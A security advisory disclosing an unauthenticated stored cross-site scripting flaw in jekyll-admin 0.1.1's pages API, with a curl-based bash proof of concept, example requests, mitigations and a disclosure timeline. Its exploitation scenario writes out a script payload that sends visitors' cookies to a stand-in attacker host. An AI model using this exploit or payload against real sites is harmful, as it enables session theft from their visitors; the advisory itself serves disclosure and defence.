# Security Advisory: Stored Cross-Site Scripting via raw_content in jekyll-admin

> **Identifier:** JM-32 / Pending CVE assignment
> **Publication Date:** 27/10/2026
> **Last Updated:** 27/10/2026
> **Severity:** High
> **CVSS:** 8.2 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation
> **Status:** Unpatched

---

## 1. Executive Summary

Jekyll Manager (jekyll-admin) 0.1.1 allows unauthenticated attackers to inject arbitrary HTML and JavaScript into generated site pages by submitting a raw Markdown file via the pages REST API. The `raw_content` field is written to disk without sanitization; per the CommonMark specification, raw HTML blocks in Markdown pass through unchanged to the rendered output. Confirmed live: `<script>alert(document.domain)</script>` was present unescaped in `GET /xss-poc.html` after a single unauthenticated PUT request. The payload persists on disk and executes in every visitor's browser.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| jekyll-admin (gem) | 0.1.1 (latest) | None | Affected |
| Component: `lib/jekyll-admin/server/page.rb` | 0.1.1 | None | Affected |

- **Repository:** https://github.com/jekyll/jekyll-admin
- **Ecosystem:** RubyGems
- **Evaluated stack:** Ruby 2.7.8, Sinatra 1.4.8, WEBrick 1.9.2, Rack 1.6.13, Jekyll 3.x + CommonMark, Linux

### Unaffected Products

- No prior versions were evaluated. No patched version exists.

---

## 3. Vulnerability Description

The `PUT /_api/pages/:path` endpoint writes the JSON field `raw_content` directly to a Markdown file on disk. Jekyll then processes the Markdown using CommonMark (or Kramdown), which passes raw HTML blocks through unchanged into the generated HTML output. No sanitization of the stored content is performed at write time or at render time.

**Root cause:**

```ruby
# lib/jekyll-admin/server/page.rb
put '/*?/?:path.:ext' do
  page_body = request_payload['raw_content']  # user-supplied, unsanitized
  write_file write_path, page_body            # written directly to disk
  render_liquid_response page
end
```

CommonMark spec (Section 4.6 — HTML blocks): a line starting with `<script`, `<style`, or other HTML block openers causes the parser to pass the entire block through without escaping.

### Necessary Conditions

- **Authentication:** None required
- **User interaction:** Required (victim must visit the injected page in their browser)
- **Attack vector:** Network
- **Preconditions:** Jekyll Manager API accessible; victim visits the URL of the injected page

---

## 4. Impact

An unauthenticated attacker can persistently inject JavaScript into any page of the site.

- **Confidentiality — High:** Session cookies, authentication tokens, and data visible on the page are exposed via the attacker's script.
- **Integrity — Low:** The page content is modified; the attack is scoped to one page per write (unlike JM-34 which affects all pages).
- **Availability — None:** No service disruption.

---

## 5. Classification

### CVSS

- **Score:** 8.2
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | High |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- CWE-862: Missing Authorization

### CAPEC

- CAPEC-86: XSS Through HTTP Query Strings
- CAPEC-198: XSS Targeting HTML Attributes

---

## 6. Exploitation Scenario

1. Attacker identifies a Jekyll Manager instance with API accessible on port 4000.
2. Attacker sends an unauthenticated `PUT /_api/pages/malicious.md` with `raw_content` containing `<script>document.location='https://attacker.invalid/?c='+document.cookie</script>`.
3. Jekyll builds the site; the generated `/malicious.html` embeds the script unescaped.
4. Any visitor to `/malicious.html` has their session cookie sent to the attacker.
5. Attacker can post a link to the page (social engineering) or chain with JM-34 to redirect a site-wide layout to include the malicious page.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): lib/jekyll-admin/server/page.rb
Endpoint: PUT /_api/pages/:path, PUT /_api/drafts/:path, PUT /_api/data/:path
Method: PUT · Authentication: not required
```

### Example Request

```http
PUT /_api/pages/xss-poc.md HTTP/1.1
Host: 127.0.0.1:4000
Content-Type: application/json

{
  "front_matter": {},
  "raw_content": "<script>alert(document.domain)</script>"
}
```

### Observed Response

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "path": "xss-poc.md",
  "raw_content": "<script>alert(document.domain)</script>\n",
  "url": "/xss-poc.html",
  "http_url": "http://0.0.0.0:4000/xss-poc.html"
}
```

Verification:

```http
GET /xss-poc.html HTTP/1.1
Host: 127.0.0.1:4000
```

Response body excerpt:

```html
<script>alert(document.domain)</script>
```

### Result

Confirmed in authorized Docker lab. The `<script>` tag was present unescaped in the rendered HTML at `/xss-poc.html`. HTTP 200 on GET. No credentials were required at any step.

**Evidence:** `evidence/poc-execution.png`, `evidence/vulnerability-exposure.png`

---

## 8. Proof of Concept

This PoC is for authorized environments only.

```bash
#!/usr/bin/env bash
# ============================================================
# JM-32 — Stored XSS via raw_content
# jekyll-admin 0.1.1 — HIGH CVSS 8.2
# CWE-79, CWE-862
# CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
#
# AUTHORIZED ENVIRONMENTS ONLY.
# This script writes a <script> tag via the pages API, verifies
# it appears unescaped in the rendered HTML, then deletes the
# test page.
# ============================================================

set -euo pipefail

TARGET="http://127.0.0.1:4000"
PAGE_SLUG="xss-poc-jm32"
PAGE_API="${TARGET}/_api/pages/${PAGE_SLUG}.md"
PAGE_URL="${TARGET}/${PAGE_SLUG}.html"
BUILD_WAIT=3

echo "============================================================"
echo "  JM-32 — Stored XSS via raw_content"
echo "  Target : ${TARGET}"
echo "  Page   : /${PAGE_SLUG}.html"
echo "============================================================"
echo ""

# ── Step 1: Write XSS payload ────────────────────────────────
echo "[*] Step 1: Writing XSS payload via raw_content (no auth)..."

HTTP_CODE=$(curl -s -o /tmp/jm32_write_response.json -w "%{http_code}" \
  -X PUT "${PAGE_API}" \
  -H "Content-Type: application/json" \
  -d '{"front_matter":{},"raw_content":"<script>alert(document.domain)</script>
"}')

echo "    PUT ${PAGE_API} → HTTP ${HTTP_CODE}"

if [ "${HTTP_CODE}" != "200" ]; then
  echo "[!] Unexpected HTTP ${HTTP_CODE}."
  cat /tmp/jm32_write_response.json 2>/dev/null || true
  exit 1
fi

RAW_IN_RESPONSE=$(python3 -c "
import json,sys
d=json.load(sys.stdin)
print(d.get('raw_content','').strip())
" < /tmp/jm32_write_response.json 2>/dev/null || echo "")
echo "    raw_content in response: ${RAW_IN_RESPONSE}"
echo ""

# ── Step 2: Wait for Jekyll build ────────────────────────────
echo "[*] Step 2: Waiting ${BUILD_WAIT}s for Jekyll to render the page..."
sleep "${BUILD_WAIT}"
echo ""

# ── Step 3: Verify payload in rendered HTML ──────────────────
echo "[*] Step 3: Verifying payload in rendered HTML (GET ${PAGE_URL})..."

RENDERED=$(curl -sf "${PAGE_URL}" 2>/dev/null || echo "")
HTTP_GET=$(curl -s -o /dev/null -w "%{http_code}" "${PAGE_URL}" 2>/dev/null || echo "000")

echo "    GET ${PAGE_URL} → HTTP ${HTTP_GET}"

if echo "${RENDERED}" | grep -q '<script>alert(document.domain)</script>'; then
  echo ""
  echo "    ✓  CONFIRMED: <script>alert(document.domain)</script> found UNESCAPED in rendered HTML"
  RESULT="CONFIRMED"
else
  # Check stored content directly
  STORED=$(curl -sf "${PAGE_API}" -H "Accept: application/json" \
    | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('raw_content','').strip())" 2>/dev/null || echo "")
  echo "    Stored raw_content: ${STORED}"
  if echo "${STORED}" | grep -q '<script>'; then
    RESULT="STORED_CONFIRMED — rendered page may need build trigger"
  else
    RESULT="INCONCLUSIVE"
  fi
fi

echo ""

# ── Step 4: Show relevant HTML excerpt ───────────────────────
echo "[*] Step 4: Relevant HTML excerpt from rendered page:"
echo "${RENDERED}" | grep -A2 -B2 'script' | head -10 || echo "    (no script tag in excerpt — check manually)"
echo ""

# ── Step 5: Clean up test page ───────────────────────────────
echo "[*] Step 5: Cleaning up test page (DELETE ${PAGE_API})..."
DEL_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X DELETE "${PAGE_API}")
echo "    DELETE ${PAGE_API} → HTTP ${DEL_CODE}"
echo ""

# ── Summary ───────────────────────────────────────────────────
echo "============================================================"
echo "  RESULT : ${RESULT}"
echo ""
echo "  Finding : JM-32"
echo "  Vuln    : Stored XSS via raw_content (CommonMark HTML passthrough)"
echo "  Impact  : Persistent JavaScript injection in any site page"
echo "  CVSS    : 8.2 HIGH"
echo "  Vector  : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
echo "  CWE     : CWE-79, CWE-862"
echo "  Auth    : None required"
echo "============================================================"
```

### Expected Result

```text
[*] Injecting XSS payload into page via raw_content...
HTTP 200 — write accepted without credentials

[*] Fetching rendered page...
GET /xss-poc.html → 200 OK
CONFIRMED: <script>alert(document.domain)</script> found in rendered HTML

[+] JM-32 CONFIRMED: Stored XSS via raw_content
    CVSS 8.2 HIGH — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
```

### PoC Limitations

- Payload is `alert(document.domain)` — non-destructive.
- Does not steal real user data.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Start an authorized local instance of jekyll-admin 0.1.1.
2. Run `bash poc.sh` or send the PUT request in section 7 manually.
3. Send `GET /xss-poc.html` and inspect the response body.
4. Confirm `<script>alert(document.domain)</script>` is present and unescaped.

---

## 10. Mitigation

Until an official fix is available:

- Add authentication to the pages/drafts/data write endpoints.
- Strip or reject raw HTML blocks from Markdown content at write time (though this is a content restriction, not a security fix).
- Enforce a Content Security Policy (`Content-Security-Policy: default-src 'self'`) on the generated site's server to block inline scripts.

---

## 11. Fix

**No official fix is available as of 27/10/2026.**

Recommended actions:

1. Add authentication middleware before any write operation.
2. Sanitize or reject `<script>`, `<iframe>`, `on*=` patterns in `raw_content` before writing to disk.
3. Alternatively, configure Jekyll to use a CommonMark option that disables raw HTML output (`unsafe: false` or equivalent).

### Recommended Change to Vendor

```ruby
# lib/jekyll-admin/server/page.rb
before do
  halt 401, json_response(401, "Unauthorized") unless authenticated?
end
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Unexpected `<script>` tags in generated `.html` files.
- `GET` requests to pages containing XSS payloads (visible in access logs).
- Markdown files with raw HTML blocks not authored by site operators.

### Example Log Search

```text
grep -r '<script' /site/_pages/ /site/_posts/
grep 'PUT /_api/pages' access.log
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 26/10/2026 | Vulnerability identified (dynamic testing in authorized lab) |
| 26/10/2026 | Confirmed in authorized Docker environment |
| 27/10/2026 | Disclosure package prepared |
| 29/10/2026 | GitHub Private Vulnerability Reporting attempted — HTTP 403 (feature disabled) |
| 29/10/2026 | Vendor notified via direct email to mertkahyaoglu93@gmail.com |
| 27/01/2027 | 90-day disclosure deadline — public disclosure if no response |
| Pending | CVE requested |
| Pending | Fix made available |
| Pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** Mert Kahyaoğlu (mertkahyaoglu93@gmail.com), Jekyll team (github.com/jekyll)
- **Channel:** Direct email (coordinated disclosure)
- **Date of first notification:** 29/10/2026
- **Response status:** Awaiting response
- **Vendor position:** N/A (awaiting)

---

## 15. Credits

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- CommonMark Spec §4.6 (HTML blocks): https://spec.commonmark.org/0.30/#html-blocks
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- jekyll-admin repository: https://github.com/jekyll/jekyll-admin

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 27/10/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized local environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/jekyll/jekyll-admin
